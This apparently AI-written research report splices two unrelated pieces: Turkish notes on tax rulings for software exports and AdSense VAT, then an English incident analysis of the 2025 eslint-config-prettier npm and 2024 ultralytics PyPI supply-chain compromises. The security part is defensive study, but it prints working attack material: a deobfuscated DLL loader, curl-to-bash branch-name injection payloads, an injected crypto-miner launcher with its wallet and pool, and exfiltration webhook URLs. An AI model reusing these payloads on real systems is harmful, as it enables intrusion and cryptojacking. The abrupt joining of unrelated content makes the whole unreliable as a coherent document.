### ÖZELGE 7 — BİLGİSAYAR PROGRAMI İTHALATI VE İHRACATI (2018)

**CDN URL:** https://cdn.gib.gov.tr/api/gibportal-file/file/getFileResources?objectKey=arsiv%2Fmevzuat%2Fuluslararasi_mevzuat%2FOZEL_2018_139158.html  
**Konu:** Bilgisayar programı ithalatı ve ihracatında vergi uygulaması  
**Tarih ve sayı:** DOĞRULANMADI (CDN erişilemedi)

**Bilinen kapsam:** Yazılım ihracatında vergi uygulaması genel ilkeleri — muhtemelen yurt dışına yazılım satışında KDV ve gümrük rejimi.

## C. REKLAM GELİRİ — ADSENSE / ADMOB

---

### ÖZELGE 8 — KOCAELİ ADSENSE (2015)

**Özelge Sayısı:** 93767041-130[12-2014/181]-29  
**Tarih:** 25.03.2015  
**Veren Birim:** Kocaeli Vergi Dairesi Başkanlığı  
**Konu:** AdSense/reklam gelirlerinin hizmet ihracatı kapsamında değerlendirilmesi ve KDV  
**İKİNCİL KAYNAK:** Evren Özmen (muhasebetr.com/evrenozmen/062) referansıyla defalarca alıntılanmış

**SONUÇ (ikincil kaynaktan):** Bu özelge, reklam gelirinin **hizmet ihracatı kapsamında** sayılabileceğini ve TL üzerinden ödeme yapılmasının bu nitelendirmeyi engellemeyeceğini söyledi. Yani AdSense gelirine KDV hesaplanmayacak. ANCAK bu özelge bir yıl sonra idarenin genel görüşüyle çelişti — Maliye "Google Türkiye'de faydalanıyor, dolayısıyla KDV konusuna girer" dedi. Bu özelge "mevcut" ama "genel idare görüşüne aykırı" durumunda.

**BİRİNCİL METİN DOĞRULANMADI.**

---

### ÖZELGE 9 — İSTANBUL AdSense/AdMob "Hatalı" Özelge (2019)

**Tarih:** 09.01.2019  
**Veren Birim:** İstanbul Vergi Dairesi Başkanlığı  
**Tam sayı:** DOĞRULANMADI  
**İKİNCİL KAYNAK:** Evren Özmen'in "Youtube, Adsense, Admob Gelirlerinde Hatalı Yeni Gelir İdaresi Özelgesi" başlıklı Medium yazısı (https://medium.com/mali-m%C3%BC%C5%9Favir-evren-%C3%B6zmen/youtube-adsense-admob-gelirlerinde-hatal%C4%B1-yeni-gelir-i%CC%87daresi-%C3%B6zelgesi-ddff8b4dd271)

**SONUÇ (ikincil kaynaktan):** Bu özelge AdSense gelirini "reklam hizmet bedeli" olarak nitelendirdi ve Google Türkiye piyasasından yararlandığı için KDV'ye tabi saydı. Özmen "hatalı" diye eleştiriyor ama bu idari görüş.

**Uyarı:** AdSense/AdMob konusunda iki zıt özelge var — 2015 Kocaeli (istisna lehine) ve 2019 İstanbul (KDV lehine). İdare görüşü 2019 sonrası KDV yönünde; Danıştay kararı yoksa bu gri alan.

## D. GENEL KDV HİZMET İHRACATI KOŞULLARI (Mevzuat Çerçevesi)

KDVK m.11/1-a + m.12/2 koşulları:
1. Hizmet Türkiye'de mukim olmayan kişi/kuruma yapılmalı
2. Hizmet bedelini içeren fatura/belge yurt dışındaki müşteri adına düzenlenmeli
3. Hizmetin faydası yurt dışında gerçekleşmeli (Türkiye'de yararlanılmama)
4. Bedel döviz olarak Türkiye'ye getirilmeli (KDV istisnası için TL de kabul ediliyor; kazanç indirimi için döviz şartı var)

**Apple/Google aracı sorusu:** Özelgeler "müşteri kim" sorusunu net cevaplamamış. Genel kabul: fatura Apple/Google'a kesilir (çünkü sözleşme onlarla), dolayısıyla "yurt dışındaki müşteri" Apple/Google'dur. Ama uygulama aynı zamanda Türkiye'den de indirilebiliyorsa "yurt dışı münhasırlık" şartı çöküyor (Özelge 38808 tam bu yüzden kritik).

## ERİŞEMEDİKLERİM

1. **gib.gov.tr doğrudan WebFetch** — bu ortamda çalışmıyor ("Unable to verify if domain gib.gov.tr is safe to fetch"). Tüm özelge sayıları ve sonuçlar ikincil kaynaklardan çekildi; birincil metin görülmedi.
2. **cdn.gib.gov.tr WebFetch** — aynı nedenle erişilemedi.
3. **Medium WebFetch** — Evren Özmen'in AdSense özelge analizleri doğrudan okunamadı; arama snippet'lerinden özetlendi.
4. **Özelge 38824 tam metni** — GİB URL bulundu ama içerik görülmedi.
5. **verginet.net tam sayfaları** — URL'ler mevcut ama içerikler erişilemedi.
6. **2022 yazılım özelgesi (ozID=3568) tam sayısı** — tam özelge sayısı ve veren birim doğrulanamadı.
7. **AdSense 2019 İstanbul özelge tam sayısı** — hiçbir ikincil kaynakta sayı yazılı değil.
8. **Özelge havuzu arama sayfası (ivd.gib.gov.tr/intvd/ozelge)** — WebFetch çalışmadığı için arama yapılamadı. Buradan direkt arama yapılsaydı çok daha fazla özelge bulunabilirdi.
9. **Freelance/serbest meslek yazılımcı için spesifik özelge sayısı** — genel rehber yazıları çok, spesifik özelge sayılı belge bulunamadı.

**Öneri:** Birincil metin için https://ivd.gib.gov.tr/intvd/ozelge adresini tarayıcıdan açıp "mobil uygulama", "yazılım ihracı", "reklam geliri" anahtar kelimeleriyle arama yap — WebFetch kısıtı olmadan doğrudan okunabilir.

# TOPIC 1 — eslint-config-prettier / npm phishing compromise (July 2025)

## Timeline (exact, from primary sources)

| When (UTC) | Event | Source |
|---|---|---|
| 2025-07-17 | Phishing email sent, spoofed `support@npmjs.com`, link to typosquat `npnjs[.]com` | [bleepingcomputer](https://www.bleepingcomputer.com/news/security/popular-npm-linter-packages-hijacked-via-phishing-to-drop-malware/) |
| 2025-07-17 17:28:28Z | `got-fetch@5.1.11` published (different maintainer, `alexghr`) | npm registry API |
| 2025-07-17 17:58:24Z | `got-fetch@5.1.12` published | npm registry API |
| 2025-07-18 15:51:53Z | `eslint-config-prettier@9.1.1` — first JounQin-account malicious publish | npm registry API |
| 2025-07-18 16:36:55Z | last malicious publish (`napi-postinstall@0.3.1`) | npm registry API |
| 2025-07-18 17:22:08Z | Issue #339 opened by `dasa`: "four new versions published with no code changes to repo" | [GH API](https://github.com/prettier/eslint-config-prettier/issues/339) |
| 2025-07-18 17:24:53Z | `onemen`: "I think that there is a virus in `node-gyp.dll`" | issue #339 |
| 2025-07-18 18:08:16Z | **JounQin**: "Damn... Whose npm token is must been leaked!" | [comment](https://github.com/prettier/eslint-config-prettier/issues/339#issuecomment-3090256757) |
| 2025-07-18 18:23:21Z | **JounQin confirms**: "Shit! It's this phishing email... I've deleted that npm token and will publish a new version ASAP." | [issuecomment-3090304490](https://github.com/prettier/eslint-config-prettier/issues/339#issuecomment-3090304490) |
| 2025-07-18 18:40:08Z | first clean release `eslint-config-prettier@10.1.8` (17 min after confirmation) | npm registry API |
| 2025-07-18 19:19:03Z | last clean release `eslint-config-prettier@9.1.2` — full remediation in ~3h27m from first malicious publish | npm registry API |
| 2025-07-18 19:50:51Z | **JounQin**: "Thanks all, and sorry for my negligence." | issue #339 |
| 2025-07-19 17:15:23Z | CVE-2025-54313 published on NVD | [NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-54313) |
| 2025-07-19 18:30:33Z | GHSA-f29h-pxvx-f335 published | [GH advisory](https://github.com/advisories/GHSA-f29h-pxvx-f335) |
| 2026-01-22 | **CVE-2025-54313 added to CISA KEV**, due date 2026-02-12 | CISA KEV JSON feed |

**Maintainer**: JounQin (npm handle `jounqin`) — confirmed. Sole npm maintainer of `synckit`, `@pkgr/core`, `napi-postinstall`; co-maintainer of `eslint-config-prettier` (with `lydell`, `thorn0`) and `eslint-plugin-prettier`.

**Phishing domain**: `npnjs[.]com` (n-p-**n**, not npm). Sender spoofed as `support@npmjs.com`. Note the nuance The Register raised: spoofed mail from **npmjs.org** passed because that domain lacked DMARC/SPF records — [theregister.com/2025/07/24/not_pretty_not_windowsonly_npm/](https://www.theregister.com/2025/07/24/not_pretty_not_windowsonly_npm/). So both `npmjs.org` (spoofed sender) and `npnjs.com` (credential-harvest landing page) are in play — your instinct about the npmjs.org lookalike was half-right, but they are two different mechanisms.

## Exact compromised versions — all verified against the GHSA vulnerability records

From `GET /advisories/GHSA-f29h-pxvx-f335` (GitHub Advisory API), authoritative version ranges + first patched:

| Package | Vulnerable | First patched | Weekly downloads (week of 2025-07-14→20, npm API) |
|---|---|---|---|
| `eslint-config-prettier` | `= 8.10.1` | 8.10.2 | **30,215,299** |
| `eslint-config-prettier` | `= 9.1.1` | 9.1.2 | (same package) |
| `eslint-config-prettier` | `>= 10.1.6, <= 10.1.7` | 10.1.8 | (same package) |
| `eslint-plugin-prettier` | `>= 4.2.2, <= 4.2.3` | 4.2.4 | **20,660,516** |
| `synckit` | `= 0.11.9` | 0.11.10 | **17,901,881** |
| `@pkgr/core` | `= 0.2.8` | 0.2.9 | **16,020,580** |
| `napi-postinstall` | `= 0.3.1` | 0.3.2 | **9,929,899** |
| `got-fetch` | `>= 5.1.11, <= 5.1.12` | 6.0.0 | **50,506** |

Every version string you listed is correct: 8.10.1, 9.1.1, 10.1.6, 10.1.7 for eslint-config-prettier; 4.2.2, 4.2.3 for eslint-plugin-prettier. **Total for the campaign week: 94,778,682 weekly downloads** (my sum from the npm API). Media consistently reported "~78 million" — that figure excludes `got-fetch` and appears to use slightly older or differently-dated snapshots. Your "~30M/week for eslint-config-prettier" is confirmed exactly: 30.2M. (For scale today, week of 2026-08-09→15: eslint-config-prettier is now **55,480,680**/week.)

**Important correction on `got-fetch`**: it is NOT part of the JounQin compromise. Maintainer is `alexghr`, and 5.1.11/5.1.12 were published **2025-07-17**, a full day *before* the JounQin publishes. It was a separate victim of the same phishing campaign, folded into the same CVE. Also note an advisory data bug: `got-fetch` "first patched version 6.0.0" was actually published **2024-07-19** — i.e. the patched version predates the malicious 5.1.x by a year, so the GHSA's remediation field is misleading here.

## GHSA / CVE IDs

There is **one** advisory covering all six packages, not one per package:
- **GHSA-f29h-pxvx-f335** — https://github.com/advisories/GHSA-f29h-pxvx-f335 — severity **high**, CVSS 3.1 **7.5** (`AV:N/AC:H/PR:N/UI:N/S:C/C:L/I:H/A:N`), CWE-506 (Embedded Malicious Code)
- **CVE-2025-54313** — https://nvd.nist.gov/vuln/detail/CVE-2025-54313
- CISA KEV entry: vendor "Prettier", product "eslint-config-prettier", added 2026-01-22, `knownRansomwareCampaignUse: Unknown`

NVD description verbatim: *"eslint-config-prettier 8.10.1, 9.1.1, 10.1.6, and 10.1.7 has embedded malicious code for a supply chain compromise. Installing an affected package executes an install.js file that launches the node-gyp.dll malware on Windows."*

## The malware

The deobfuscated payload, posted by `martincostello` in issue #339 at 2025-07-18T17:41:01Z — this is the actual code, from the Renovate diff of 10.1.5→10.1.7:

```javascript
if(os.platform() === 'win32') {
    const tempDir = os.tmpdir();
    require('chi'+'ld_pro'+'cess')["sp"+"awn"]("rund"+"ll32",
    [path.join(__dirname, './node-gyp' + '.dll') + ",main"]);
    log(`Temp directory: ${tempDir}`);
    const files = cache.readdirSync(tempDir);
    log(`Number of files in temp directory: ${files.length}`);
}
```

String-splitting (`'chi'+'ld_pro'+'cess'`) to defeat naive static scanners. Wrapper function is named `logDiskSpace()`. Windows-only — exits immediately on Linux/macOS, which spares most CI runners (GitHub Actions, CircleCI, GitLab default to Linux images).

**"Scavenger" naming**: named by InvokeRE, not Trend Micro — https://invokere.com/posts/2025/07/scavenger-malware-distributed-via-eslint-config-prettier-npm-package-supply-chain-compromise/ (also catalogued at [Malpedia](https://malpedia.caad.fkie.fraunhofer.de/library/d7d896ff-a3b5-4f10-b316-aa5d31d95030/)). The name comes from a debug path string containing "scavenger" left in a lighter variant, plus C2 domain overlap. **Your attribution to Trend Micro is wrong** — I found no Trend Micro report naming it. **DOĞRULANMADI** (secondary sources only, invokere.com and stepsecurity.io are both blocked to my fetcher, so this rests on search-result summaries):
- `node-gyp.dll` is PE32+, MSVC C++, export name `loader.dll`, compile timestamp **2025-07-18 08:59:38** — i.e. compiled the same morning, ~7 hours before the first malicious publish
- Exfiltrates `.npmrc` contents (npm auth tokens) — token-theft-for-further-supply-chain-attack, which is the notable part
- Drops a second-stage infostealer targeting browser data (visited URLs, cache)
- Anti-analysis: enumerates loaded modules for `snxhk.dll` (Avast), `SbieDll.dll` (Sandboxie), `cmdvrt32.dll` (Comodo)
- VirusTotal detection at time of reporting: **19/72**

A detection signal missed by tooling and worth noting: `martincostello` observed at 18:00:32Z that the legitimate prior releases carried **npm provenance attestations and the malicious ones did not** — a machine-checkable discriminator that no consumer tooling acted on.

## Link to Shai-Hulud — NOT established

**DOĞRULANMADI, and I lean against it.** The domains differ and are separate registrations:
- July 2025 (this incident): `npnjs[.]com`
- September 2025 (chalk/debug, then Shai-Hulud): `npmjs[.]help`, registered 2025-09-05, used 2025-09-08 13:00 UTC against Josh Junon (`qix`), who entered credentials at 13:16 UTC — [Sygnia](https://www.sygnia.co/threat-reports-and-advisories/npm-supply-chain-attack-september-2025/)

Published attribution links Shai-Hulud to the **August 27 Nx compromise**, not to the July prettier campaign — [Zscaler ThreatLabz](https://www.zscaler.com/blogs/security-research/mitigating-risks-shai-hulud-npm-worm), [Unit 42](https://unit42.paloaltonetworks.com/npm-supply-chain-attack/), [Securelist](https://securelist.com/shai-hulud-worm-infects-500-npm-packages-in-a-supply-chain-attack/117547/). The genuine *conceptual* through-line is that Scavenger stole `.npmrc` tokens in July and Shai-Hulud automated exactly that theft-and-republish loop in September — but no primary source I found asserts one actor or one kit. Do not state the link as fact.

**Same-campaign sibling that IS confirmed**: the `is` package (2.8M weekly downloads), maintained by Jordan Harband, hijacked 2025-07-19 with versions **3.3.1** and **5.0.0**. Different vector — the attacker social-engineered Harband via email posing as a removed co-owner asking to be re-added. Harband, quoted: *"Everything seemed normal, so I obliged (irritated that npm would remove an owner without notifying the other owners) and the next morning this was published."* Crucially this payload was **cross-platform** (Node.js on macOS/Linux/Windows) and persisted by overwriting `index.js` so deleting `node_modules` would not remove it — materially worse than the prettier payload. [bleepingcomputer](https://www.bleepingcomputer.com/news/security/npm-package-is-with-28m-weekly-downloads-infected-devs-with-malware/), [StepSecurity](https://www.stepsecurity.io/blog/another-npm-supply-chain-attack-the-is-package-compromise).

# TOPIC 2 — ultralytics PyPI compromise (December 2024)

## Timeline (UTC) — PyPI audit logs are authoritative here

The definitive record is PyPI administrator **Ee Durbin** (`ewdurbin`) posting internal audit logs directly in the issue thread, 2024-12-06T17:05:27Z — https://github.com/ultralytics/ultralytics/issues/18027#issuecomment-2523713289

```
2024-12-04 20:51:12.278525  ultralytics 8.3.41 release created
2024-12-04 20:51:15.187966  ultralytics-8.3.41.tar.gz uploaded
2024-12-04 20:51:12.278525  ultralytics-8.3.41-py3-none-any.whl uploaded
2024-12-05 09:15:06.355361  ultralytics 8.3.41 release removed
2024-12-05 12:47:29.385127  ultralytics 8.3.42 release created
2024-12-05 12:47:29.385127  ultralytics-8.3.42-py3-none-any.whl uploaded
2024-12-05 12:47:32.363731  ultralytics-8.3.42.tar.gz uploaded
2024-12-05 13:47:30.142165  ultralytics 8.3.42 release removed
```

Exposure: **8.3.41 = 12h 23m 54s**; **8.3.42 = 1h 0m 1s**.

Full sequence, combining the above with William Woodruff's (Trail of Bits) writeup at https://blog.yossarian.net/2024/12/06/zizmor-ultralytics-injection:

- **2024-12-03 22:28:49** — attacker begins experimenting
- **2024-12-03 22:33:47** — PR #17984 submitted with a `GITHUB_TOKEN` stealer script
- **2024-12-04 19:33** — PR #18018 (first malicious branch name)
- **2024-12-04 19:57** — PR #18020 (second malicious branch name)
- **2024-12-04 20:51** — v8.3.41 to PyPI, **with valid Sigstore attestations**
- **2024-12-05 05:35:39** — ComfyUI-Impact-Pack issue #843 filed (earliest public report I found, ~1h before the ultralytics issue)
- **2024-12-05 06:34:37** — ultralytics issue #18027 filed by `metrizable`
- **2024-12-05 12:47** — v8.3.42, still malicious
- **2024-12-05 ~19:47** — v8.3.43 released clean
- **2024-12-07 01:41:45** — **v8.3.45 pushed directly to PyPI via API token**, no CI run, no attestations
- **2024-12-07 02:27:14** — **v8.3.46**, same
- **2024-12-07 10:08:32** — v8.3.45 removed (~8h 27m exposure)
- **2024-12-07 10:09:08** — v8.3.46 removed (~7h 42m exposure)

**Your second-wave hypothesis is correct.** 8.3.45 and 8.3.46 on Dec 7 — and yes, the attacker retained access. Per the [PyPI blog post-mortem](https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/), the second wave used *"an unrevoked PyPI API token that was still available to the GitHub Actions workflow."* The absence of attestations on the second wave is what made it detectable: *"there were no corresponding source repository activity or PyPI publish attestations."*

## Attack vector — exact mechanics

Two distinct stages, and this is where most secondary coverage gets it muddled.

**Stage 1 — template injection via `pull_request_target`.** The vulnerable trigger was in `.github/workflows/format.yml`, and the injection sink was inside a *composite action* in `ultralytics/actions`, with unquoted expansion:

```
git pull origin ${{ github.head_ref || github.ref }}
```

The malicious PR branch names (these are the literal branch names):

- PR **#18018**: `$({curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/12e4f54ca3f2e69bcdc900d1c6e16642ca8ae545/file.sh}${IFS}|${IFS}bash)`
- PR **#18020**: `$({curl,-sSfL,raw.githubusercontent.com/ultralytics/ultralytics/d8daa0b26ae0c221aa4a8c20834c4dbfef2a9a14/file.sh}${IFS}|${IFS}bash)`

`${IFS}` substitutes for spaces to survive branch-name character restrictions. Note the payload was hosted at `raw.githubusercontent.com/ultralytics/ultralytics/<dangling-commit-sha>/file.sh` — dangling commits in the *victim's own* repo, so the fetch looks first-party.

**Stage 2 — GitHub Actions cache poisoning.** With code execution in the low-privilege PR job, the attacker poisoned the pip cache key:

```
setup-python-Linux-x64-22.04-Ubuntu-python-3.12.7-pip-b25cacffbe61fd843ecfbb789bb607be3256af9f6e06a467b860c4324e336ee
```

The privileged release job later restored that cache, so the malicious source landed **during the build** — after the commit was resolved, before the artifact was signed. This is why Sigstore log index 153589717 for 8.3.42 points to commit `950d9f73fc3e12c87e45f4f792281ee8e3cfc75f`, which contains no malicious files. The attestation was *valid and truthful* about a build whose inputs were poisoned.

**Discoverer / credit** — your recollection needs splitting three ways:
- **`metrizable`** filed the original bug report (#18027)
- **Adnane Khan** (`AdnaneKhan`, adnanthekhan.com) identified the cache-poisoning vector and, at 2024-12-06T17:47:55Z, made the sharpest finding in the whole thread: the injection point *"was introduced in https://github.com/ultralytics/actions/commit/c1365cedb65b86d4f77cabc192873ee4b6b33276. 10 days after Ultralytics published the advisory for the first vulnerability..."* — i.e. this was a **regression of GHSA-7x29-qqmq-v6qc**, which Khan himself had reported and which was published 2024-08-14.
- **William Woodruff** (`woodruffw`, Trail of Bits, co-author of PyPI Trusted Publishing + attestations) did the live IOC writeup and found the attacker's earlier experimentation gist that confirmed the cache vector.
- I found no "Cody Brown" involvement — that appears to be a misremembering.

Khan's foundational research, which he'd published 7 months earlier and which predicted this exact attack: https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/ — his comment in-thread: *"I had postulated in my post on Cache Poisoning how it could pierce the integrity of what otherwise would be a SLSA L3 build. Crazy to see it used in the wild."* Follow-up: https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache/

## Payload — XMRig, pool, wallet

Exact command, recovered from an infected install and posted by `GhostDog98` at 2024-12-06T03:56:10Z, and independently by `otupa` in the ComfyUI issue as the actual `safe_run()` function injected into `ultralytics/utils/downloads.py`:

```python
def safe_run(path):
    os.chmod(path, 0o770)
    command = [
        path, '-u',
        '4BHRQHFexjzfVjinAbrAwJdtogpFV3uCXhxYtYnsQN66CRtypsRyVEZhGc8iWyPViEewB8LtdAEL7CdjE4szMpKzPGjoZnw',
        '-o', 'connect.consrensys.com:8080',
        '-k'
    ]
    process = subprocess.Popen(command, stdin=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL, preexec_fn=os.setsid, close_fds=True)
    os.remove(path)
```

- **Monero wallet**: `4BHRQHFexjzfVjinAbrAwJdtogpFV3uCXhxYtYnsQN66CRtypsRyVEZhGc8iWyPViEewB8LtdAEL7CdjE4szMpKzPGjoZnw`
- **Pool**: `connect.consrensys[.]com:8080` — a typosquat of Consensys (consensys.io), and Khan resolved it live: it is a **CNAME to `pool.supportxmr.com`** → `pool-nyc.supportxmr.com` → `104.243.43.115`, `104.243.33.118`
- Binary dropped to `/tmp/ultralytics_runner`, fetched via the GitHub blobs API: `https://api.github.com/repos/ultralytics/ultralytics/git/blobs/5e67b0e4375f63eb6892b33b1f98e900802312c2` (and `665bb8add8c21d28a961fe3f93c12b249df10787` for the other platform)
- Miner binary SHA256: **`b0e1ae6d73d656b203514f498b59cbcf29f067edf6fbd3803a3de7d21960848d`** ([VirusTotal](https://www.virustotal.com/gui/file/b0e1ae6d73d656b203514f498b59cbcf29f067edf6fbd3803a3de7d21960848d)), posted by `renzhexigua`
- The script deletes the binary after launch (`os.remove(path)`) and suppresses all three stdio streams

**Actual attacker earnings: roughly $20–$40.** `GhostDog98` pulled the supportxmr dashboard for the wallet at 2024-12-06T04:07:31Z: *"lmao, they've made a total of ~$20-$40"*. The wallet was **banned on supportxmr on 2024-12-06T14:45:05Z** — pool operator `M5M400` confirmed in-thread: *"@GhostDog98 thanks for your email report. banned on supportxmr."* Worth holding onto: an attack that reached tens of millions of installs and burned a novel SLSA-piercing technique netted less than a restaurant meal.

Additional IOCs (Woodruff, in-thread and in his blog):
- GitHub accounts: `openimbot` (the account Glenn Jocher identified and blocked), `jiwuwgknvm` (deleted), `jeficmer456` (deleted), plus the compromised `UltralyticsAssistant` bot
- Emails: `fowevjweoj@consrensys.com`, `jefic64219@confmin.com`, `jefic64219@proton.me`, `0b4c7ddc61d5cafe49babc3dd544c5aa0b03815c@proton.me`
- Exfil: `webhook.site/31c2eb17-ae87-4aaf-835a-ef2d225d58d0`, `webhook.site/9212d4ee-df58-41db-886a-98d180a912e6`

## Glenn Jocher's statements — exact quotes and URLs

Thread: https://github.com/ultralytics/ultralytics/issues/18027

**2024-12-05T14:22:28Z** — first acknowledgement:
> "@renzhexigua thanks for the analysis, I believe you are correct. Git clones (including those in the Docker images should be safe), local `pip install .` should also be safe, but there appears to be malicious code injection in the pypi deployment workflow itself that affected 8.3.41 and 8.3.42. We've stopped automatic deployments to investigate further. IMPORTANT: Delete any `ultralytics==8.3.41` and `ultrlaytics==8.3.42` versions that may be installed locally as these are both affected. `ultralytics<=8.3.40` is safe."

**2024-12-05T15:17:23Z** — attacker identification:
> "@bigbitbus yes we can see in the logs unauthorized access from a user in Hong Kong about 15 hours ago. User is https://github.com/openimbot (now blocked)."

**2024-12-05T21:21:26Z** — confirming the vector:
> "@christophetd @vielmetti @lazka yes, thank you, those are the correct malicious PRs with code injection in the branch names by a user in Hong Kong late yesterday. This should be resolved now in `ultralytics>=8.3.43` which we just released an hour ago."

Note this Dec 5 "resolved" claim was falsified two days later by the 8.3.45/8.3.46 wave — the API token had not been rotated.

The harshest exchange, and the substantive criticism of the response, is `zopieux` at **2024-12-05T16:51:22Z**:
> "I already told them that much (infected build dependencies/environment) in an email to their security team **and** in the security advisory **16 hours ago**, 4h after they released it in the wild. The fact they managed to ignore this and push a new infected release reeks incompetence. Please do better, thousands of people are using this package directly or through dependent packages."

And Khan at 2024-12-05T22:14:58Z pressing for disclosure:
> "@glenn-jocher do you plan to release a public advisory via GitHub for Ultralytics 8.3.41 and 8.3.42? Ultralytics has the responsibility to do so here... There are likely still people out there running the malicious miner on their system that have no idea something is wrong."

## GHSA IDs — and the one that never shipped

**There is no published GHSA for the ultralytics PyPI compromise itself.** I verified this directly: `GET /advisories?ecosystem=pip&affects=ultralytics` returns **zero results**, and the advisory `zopieux` drafted — **GHSA-36wh-cc56-8jm9** (https://github.com/ultralytics/ultralytics/security/advisories/GHSA-36wh-cc56-8jm9) — returns **HTTP 404** from the GitHub advisories API today, 20 months later. It was never made public. Khan explicitly demanded publication in-thread; it did not happen. This is a real, checkable accountability gap: the only durable machine-readable record is a third-party one, **Snyk SNYK-PYTHON-ULTRALYTICS-8492063** (https://security.snyk.io/vuln/SNYK-PYTHON-ULTRALYTICS-8492063).

The related advisory that does exist is the **prior** vulnerability whose fix regressed:
- **GHSA-7x29-qqmq-v6qc** — https://github.com/advisories/GHSA-7x29-qqmq-v6qc — "GitHub Actions Script Injection in `ultralytics/actions`", severity **high**, published **2024-08-14T20:53:47Z**, affects `ultralytics/actions <= 0.0.2`, **no CVE assigned**

## PyPI's response

Post-mortem: https://blog.pypi.org/posts/2024-12-11-ultralytics-attack-analysis/ (published 2024-12-11, credits William Woodruff). Actions taken: removed all four malicious releases; investigated via Sigstore transparency logs and provenance attestations; opened tracking issues for two concrete platform improvements — **detecting unused API tokens that coexist with Trusted Publishers** (the exact failure mode here) and **warning on unconfigured GitHub Environments**; continued work on malware detection APIs and a "quarantine" release status.

Woodruff's important caveat on why the obvious fix doesn't work, 2024-12-06T18:39:06Z, responding to Khan's suggestion of diffing the sdist against the attested source commit:
> "That would be fantastic, but it's unfortunately not trivial: a Python sdist (`.tar.gz`) isn't a plain archive of the source tree at tag/release time, since build/packaging backends have wide latitude in what they choose to include... (Source: I was one of the people who built Trusted Publishing + attestations.)"

## Downstream impact

**ComfyUI**: hit first and hardest — ultralytics arrives as a transitive dependency of **ComfyUI-Impact-Pack** via its `install.py`. Earliest public incident report anywhere is https://github.com/ltdrdata/ComfyUI-Impact-Pack/issues/843 (2024-12-05T05:35:39Z), which contained the full decompiled miner command an hour before the ultralytics issue existed. Follow-on: [Comfy-Org/ComfyUI-Manager#1308](https://github.com/Comfy-Org/ComfyUI-Manager/issues/1308).

I could not find a SwarmUI-specific issue. Confirmed affected downstreams I did find:
- **Bing-su/adetailer** [#749](https://github.com/Bing-su/adetailer/issues/749) — 2024-12-05T03:30:34Z, *earliest timestamp of any report I located*, though the reporter read it as a `FileNotFoundError: '/tmp/ultralytics_runner'` bug rather than malware
- **Panchovix/stable-diffusion-webui-reForge** [#196](https://github.com/Panchovix/stable-diffusion-webui-reForge/issues/196)
- **serengil/deepface** [#1394](https://github.com/serengil/deepface/issues/1394)
- **opendatalab/MinerU** [#1202](https://github.com/opendatalab/MinerU/issues/1202)
- **jhj0517/AdvancedLivePortrait-WebUI** [#19](https://github.com/jhj0517/AdvancedLivePortrait-WebUI/issues/19)
- **robertknight/rten** [#442](https://github.com/robertknight/rten/issues/442)
- **BaseballCV** [#56](https://github.com/BaseballCV/BaseballCV/issues/56)
- **ogkalu2/comic-translate** [#184](https://github.com/ogkalu2/comic-translate/issues/184)

# Things I saw that you did not ask about

1. **Renovate and Dependabot were the propagation mechanism, in both incidents.** I found live bot PRs auto-upgrading *into* the malicious ultralytics versions: [hongbo-miao/hongbomiao.com#21214](https://github.com/hongbo-miao/hongbomiao.com/pull/21214) (to 8.3.41, opened 2024-12-04T21:06:00Z — **15 minutes after** the malicious upload) and [#21241](https://github.com/hongbo-miao/hongbomiao.com/pull/21241) (to 8.3.42), plus [magpie#515](https://github.com/2024-CMPU9010-GROUP-3/magpie/pull/515). In the npm incident this was the *first thing* maintainers worried about — `martincostello` at 18:24:05Z: *"Before npm take them down, can you mark the bad packages as deprecated? Then maybe dependabot, renovate etc. won't offer them as upgrades to people."* JFrog wrote this up as its own thesis: https://jfrog.com/blog/npm-automated-patching-breach/. If you want a single spine connecting both incidents, this is stronger and better-evidenced than the Shai-Hulud angle you asked about: **automated dependency updating converts a hours-long registry exposure window into permanent lockfile persistence.**

2. **Google Colab mass-banned users** whose accounts mined XMR unknowingly — [googlecolab/colabtools#4989](https://github.com/googlecolab/colabtools/issues/4989), 2024-12-05T12:19:25Z, "This account has been blocked from accessing Colab runtimes due to suspected abusive activity." Victims were punished as attackers.

3. **The GitHub Release tarball was also poisoned**, not just PyPI — `wcc526`, 2024-12-05T09:09:28Z. Most coverage says "PyPI only, git clone was safe"; Glenn Jocher said git clones were safe. That claim is contested in-thread and I could not resolve it.

4. **`zizmor` would have caught it.** Woodruff's static analyzer flags exactly this `pull_request_target` + template-injection pattern; the gap was that it could not yet audit *composite actions*, which is precisely where the sink lived. Relevant if you're thinking about detection tooling as a product surface.

5. **The `is` package payload was strictly worse than the prettier one** — cross-platform, and persisted by overwriting `index.js` so `rm -rf node_modules` did not clean it. It got a fraction of the press because the download count was smaller.

6. **`git pull origin ${{ github.head_ref }}` is the reusable primitive here**, not "ultralytics had a bug." GitHub's own docs page on the class was linked in-thread: https://github.com/github/docs/blob/main/content/get-started/using-git/dealing-with-special-characters-in-branch-and-tag-names.md

7. **Both incidents show the same detection signal being ignored: missing provenance/attestations.** npm provenance absent on the malicious prettier releases; PyPI attestations absent on ultralytics 8.3.45/8.3.46. In both cases a human noticed after the fact and no tooling gated on it. That is a fairly clean, unclaimed problem statement.

# What I could NOT access

- **socket.dev, stepsecurity.io, checkmarx.com, invokere.com** — all four returned "Unable to verify if domain is safe to fetch" from my fetcher. Everything sourced to them here comes from search-result summaries, not the primary text. This specifically weakens: the Scavenger DLL compile timestamp/hashes/anti-analysis details, and the Checkmarx got-fetch writeup.
- **The two screenshots in JounQin's confirmation comment** — the actual phishing email headers and the npm token-creation notification are images (`user-attachments/assets/591bdf7b-...` and `05f463f7-...`). I cannot read them. So the *exact* sender address as it appeared in his inbox is secondhand (bleepingcomputer says spoofed `support@npmjs.com`); the `npnjs.com` landing domain is well-corroborated.
- **GHSA-36wh-cc56-8jm9** — 404, never published. Contents unknown beyond zopieux's in-thread description.
- **The poisoned cache entry itself** and the payload blobs (`5e67b0e4...`, `665bb8ad...`) — both 404 on GitHub. The miner binary survives only via the VirusTotal hash above.
- **X/Twitter posts** — JounQin's confirmation tweet and `probably_coding/status/1946275583958106232` (which surfaced 8.10.1/9.1.1) are not fetchable. The GitHub comments cover the same ground, so no real loss.
- **Trend Micro** — I searched specifically and found no Trend Micro report on Scavenger. If one exists I did not reach it; treat the Trend Micro attribution in your notes as unsupported.
- **SwarmUI** — no issue found. Either it was unaffected or the report lives somewhere I did not reach; I would not assert impact.
